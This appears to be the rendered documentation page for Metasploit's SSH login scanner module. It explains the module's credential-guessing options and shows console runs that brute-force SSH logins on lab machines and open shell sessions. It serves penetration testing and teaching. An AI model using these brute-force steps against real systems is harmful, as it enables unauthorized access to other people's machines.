{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/scanner/ssh/ssh_login","result":{"data":{"moduleMetadataJson":{"id":"952210a0-4af3-52cd-9696-ff086d1622cd","name":"SSH Login Check Scanner","fullname":"auxiliary/scanner/ssh/ssh_login","description":"This module will test ssh logins on a range of machines and\n        report successful logins.  If you have loaded a database plugin\n        and connected to a database this module will record successful\n        logins and hosts so you can track your access.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/scanner/ssh/ssh_login","documentationSlug":"/modules/documentation/auxiliary/scanner/ssh/ssh_login","referencesSlug":"/modules/references/auxiliary/scanner/ssh/ssh_login"},"documentation":{"html":"<h2 id=\"ssh-service\" style=\"position:relative;\"><a href=\"#ssh-service\" aria-label=\"ssh service permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SSH Service</h2>\n<p>  SSH, Secure SHell, is an encrypted network protocol used to remotely interact with an Operating System at a command line level.  SSH is available on most every system, including Windows, but is mainly used by *nix administrators.\nThis module attempts to login to SSH with username and password combinations.  For public/private SSH keys, please use <code class=\"language-text\">auxiliary/scanner/ssh/ssh_login_pubkey</code>.\nIt should be noted that some modern Operating Systems have default configurations to not allow the <code class=\"language-text\">root</code> user to remotely login via SSH, or to only allow <code class=\"language-text\">root</code> to login with an SSH key login.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install SSH and start it.</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use auxiliary/scanner/ssh/ssh_login</code></li>\n<li>Do: <code class=\"language-text\">set rhosts</code></li>\n<li>Do: set usernames and passwords via any of the available options</li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You will hopefully see something similar to, followed by a session:</li>\n</ol>\n<p>  <code class=\"language-text\">[+] SSH - Success: &#39;msfadmin:msfadmin&#39; &#39;uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux &#39;</code></p>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>BLANK_PASSWORD</strong></p>\n<p>  Boolean value on if an additional login attempt should be attempted with an empty password for every user.</p>\n<p>  <strong>PASSWORD</strong></p>\n<p>  Password to try for each user.</p>\n<p>  <strong>PASS_FILE</strong></p>\n<p>  A file containing a password on every line.  Kali linux example: <code class=\"language-text\">/usr/share/wordlists/metasploit/password.lst</code></p>\n<p>  <strong>RHOSTS</strong></p>\n<p>  Either a comma space (<code class=\"language-text\">,</code>) separated list of hosts, or a file containing list of hosts, one per line.  File Example: <code class=\"language-text\">file:/root/ssh_hosts.lst</code>, list example: <code class=\"language-text\">192.168.0.1</code> or <code class=\"language-text\">192.168.0.1, 192.168.0.2</code></p>\n<p>  <strong>STOP<em>ON</em>SUCCESS</strong></p>\n<p>  If a valid login is found on a host, immediately stop attempting additional logins on that host.</p>\n<p>  <strong>USERNAME</strong></p>\n<p>  Username to try for each password.</p>\n<p>  <strong>USERPASS_FILE</strong></p>\n<p>  A file containing a username and password, separated by a space, on every line.  An example line would be <code class=\"language-text\">username password</code></p>\n<p>  <strong>USER<em>AS</em>PASS</strong></p>\n<p>  Boolean value on if an additional login attempt should be attempted with the password as the username.</p>\n<p>  <strong>USER_FILE</strong></p>\n<p>  A file containing a username on every line.</p>\n<p>  <strong>VERBOSE</strong></p>\n<p>  Show a failed login attempt.  This can get rather verbose when large <code class=\"language-text\">USER_FILE</code>s or <code class=\"language-text\">PASS_FILE</code>s are used.  A failed attempt will look similar to the following:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[-] SSH - Failed: &#39;msfadmin:virtual&#39;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"option-combinations\" style=\"position:relative;\"><a href=\"#option-combinations\" aria-label=\"option combinations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Option Combinations</h2>\n<p>It is important to note that usernames and passwords can be entered in multiple combinations.  For instance, a password could be set in <code class=\"language-text\">PASSWORD</code>, be part of either <code class=\"language-text\">PASS_FILE</code> or <code class=\"language-text\">USERPASS_FILE</code>, be guessed via <code class=\"language-text\">USER_AS_PASS</code> or <code class=\"language-text\">BLANK_PASSWORDS</code>.\nThis module makes a combination of all of the above when attempting logins.  So if a password is set in <code class=\"language-text\">PASSWORD</code>, and a <code class=\"language-text\">PASS_FILE</code> is listed, passwords will be generated from BOTH of these.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>  Example run against:</p>\n<ul>\n<li>Ubuntu 14.04 Server with root login permitted: 192.168.2.156</li>\n<li>Ubuntu 16.04 Server: 192.168.2.137</li>\n<li>Metasploitable: 192.168.2.46</li>\n<li>Metasploitable 2: 192.168.2.35</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/scanner/ssh/ssh_login\nmsf auxiliary(ssh_login) &gt; cat /root/ssh_passwords.lst\n[*] exec: cat /root/ssh_passwords.lst\n\nmsfadmin\nbadpassword\nroot\nubuntu\n\nmsf auxiliary(ssh_login) &gt; set pass_file /root/ssh_passwords.lst\npass_file =&gt; /root/ssh_passwords.lst\nmsf auxiliary(ssh_login) &gt; cat /root/ssh_un.lst\n[*] exec: cat /root/ssh_un.lst\n\nmsfadmin\nbadpassword\nroot\nubuntu\n\nmsf auxiliary(ssh_login) &gt; set user_file /root/ssh_un.lst\nuser_file =&gt; /root/ssh_un.lst\nmsf auxiliary(ssh_login) &gt; cat /root/ssh_hosts.lst\n[*] exec: cat /root/ssh_hosts.lst\n\n192.168.2.156\n192.168.2.137\n192.168.2.35\n192.168.2.46\nmsf auxiliary(ssh_login) &gt; set rhosts file:/root/ssh_hosts.lst\nrhosts =&gt; file:/root/ssh_hosts.lst\nmsf auxiliary(ssh_login) &gt; set verbose false\nverbose =&gt; false\nmsf auxiliary(ssh_login) &gt; set threads 4\nthreads =&gt; 4\nmsf auxiliary(ssh_login) &gt; exploit\n\n[*] SSH - Starting bruteforce\n[*] SSH - Starting bruteforce\n[*] SSH - Starting bruteforce\n[*] SSH - Starting bruteforce\n[+] SSH - Success: &#39;msfadmin:msfadmin&#39; &#39;uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux &#39;\n[+] SSH - Success: &#39;msfadmin:msfadmin&#39; &#39;uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux &#39;\n[*] Command shell session 5 opened (192.168.2.117:44415 -&gt; 192.168.2.46:22) at 2017-02-22 20:26:13 -0500\n[*] Command shell session 6 opened (192.168.2.117:36107 -&gt; 192.168.2.35:22) at 2017-02-22 20:26:13 -0500\n[+] SSH - Success: &#39;root:ubuntu&#39; &#39;uid=0(root) gid=0(root) groups=0(root) Linux Ubuntu14 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[*] Command shell session 7 opened (192.168.2.117:32829 -&gt; 192.168.2.156:22) at 2017-02-22 20:26:35 -0500\n[+] SSH - Success: &#39;ubuntu:ubuntu&#39; &#39;uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare) Linux Ubuntu14 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[*] Command shell session 8 opened (192.168.2.117:42205 -&gt; 192.168.2.156:22) at 2017-02-22 20:26:42 -0500\n[+] SSH - Success: &#39;ubuntu:ubuntu&#39; &#39;uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[*] Command shell session 9 opened (192.168.2.117:37027 -&gt; 192.168.2.137:22) at 2017-02-22 20:26:44 -0500\n[*] Scanned 3 of 4 hosts (75% complete)\n[*] Scanned 4 of 4 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(ssh_login) &gt; sessions -l\n\nActive sessions\n===============\n\n  Id  Type          Information                              Connection\n  --  ----          -----------                              ----------\n  5   shell /linux  SSH msfadmin:msfadmin (192.168.2.46:22)  192.168.2.117:44415 -&gt; 192.168.2.46:22 (192.168.2.46)\n  6   shell /linux  SSH msfadmin:msfadmin (192.168.2.35:22)  192.168.2.117:36107 -&gt; 192.168.2.35:22 (192.168.2.35)\n  7   shell /linux  SSH root:ubuntu (192.168.2.156:22)       192.168.2.117:32829 -&gt; 192.168.2.156:22 (192.168.2.156)\n  8   shell /linux  SSH ubuntu:ubuntu (192.168.2.156:22)     192.168.2.117:42205 -&gt; 192.168.2.156:22 (192.168.2.156)\n  9   shell /linux  SSH ubuntu:ubuntu (192.168.2.137:22)     192.168.2.117:37027 -&gt; 192.168.2.137:22 (192.168.2.137)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  Example run against:</p>\n<ul>\n<li>Windows 10 w/ Linux Subsystem</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/scanner/ssh/ssh_login\nmsf auxiliary(ssh_login) &gt; set rhosts 192.168.2.140\nrhosts =&gt; 192.168.2.140\nmsf auxiliary(ssh_login) &gt; set username winuser\nusername =&gt; winuser\nmsf auxiliary(ssh_login) &gt; set password &quot;badpassword&quot;\npassword =&gt; badpassword\nmsf auxiliary(ssh_login) &gt; exploit\n\n[*] SSH - Starting bruteforce\n[+] SSH - Success: &#39;winuser:badpassword&#39; &#39;&#39;\n[!] No active DB -- Credential data will not be saved!\n[*] Command shell session 1 opened (192.168.2.117:42227 -&gt; 192.168.2.140:22) at 2017-02-22 20:40:12 -0500\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(ssh_login) &gt; sessions -l\n\nActive sessions\n===============\n\n  Id  Type     Information                               Connection\n  --  ----     -----------                               ----------\n  1   shell /  SSH winuser:badpassword (192.168.2.140:22)  192.168.2.117:42227 -&gt; 192.168.2.140:22 (192.168.2.140)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  Example run against:</p>\n<ul>\n<li>Windows 10 w/ Bitvise SSH Server (WinSSHD) version 7.26-r2 and a virtual account created</li>\n</ul>\n<p>  It is important to note here that the module gives back a <strong>Success</strong>, but then errors when trying to identify the remote system.\nThis should be enough info to manually exploit via a regular SSH command.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/scanner/ssh/ssh_login\nmsf auxiliary(ssh_login) &gt; set rhosts 192.168.2.140\nrhosts =&gt; 192.168.2.140\nmsf auxiliary(ssh_login) &gt; set username virtual\nusername =&gt; virtual\nmsf auxiliary(ssh_login) &gt; set password virtual\npassword =&gt; virtual\nmsf auxiliary(ssh_login) &gt; exploit\n\n[*] SSH - Starting bruteforce\n[+] SSH - Success: &#39;virtual:virtual&#39; &#39;id: Command not found.  help ?: Command not found.  &#39;\n[!] No active DB -- Credential data will not be saved!\n[*] 192.168.2.140 - Command shell session 4 closed.  Reason: Died from EOFError\n[*] Command shell session 4 opened (192.168.2.117:36169 -&gt; 192.168.2.140:22) at 2017-02-22 21:20:24 -0500\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"952210a0-4af3-52cd-9696-ff086d1622cd"}}}